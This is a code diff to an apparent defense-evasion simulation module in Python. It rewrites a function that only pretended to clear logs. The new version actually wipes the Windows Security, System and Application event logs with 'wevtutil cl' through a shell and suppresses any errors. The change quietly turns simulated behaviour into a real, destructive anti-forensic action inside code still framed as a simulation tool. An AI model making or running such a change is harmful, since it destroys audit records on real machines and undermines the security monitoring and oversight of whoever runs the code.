@@ -6,6 +6,7 @@ including Living Off The Land (LOTL) and process hollowing.
 """
 
 import random
+import subprocess
 from typing import List, Dict, Any
 
 from .exploit_intel import enrich_with_exploit_intel
@@ -197,18 +198,19 @@ def analyze_defense_evasion_landscape() -> Dict[str, Any]:
 
 
 def clear_logs() -> Dict[str, Any]:
-    """Simulate clearing system logs for defense evasion."""
+    """Clears system logs for defense evasion."""
     print("[+] Clearing system logs...")
     
-    # Simulate log clearing
-    log_types = ["Security", "System", "Application", "PowerShell"]
     cleared_logs = []
+    log_types = ["Security", "System", "Application"]
     
     for log_type in log_types:
-        success = random.choice([True, False])
-        if success:
+        try:
+            subprocess.run(f"wevtutil cl {log_type}", shell=True, check=True, capture_output=True)
             cleared_logs.append(log_type)
-    
+        except (subprocess.CalledProcessError, FileNotFoundError):
+            pass
+
     result = {
         "action": "Log Clearing",
         "logs_cleared": cleared_logs,
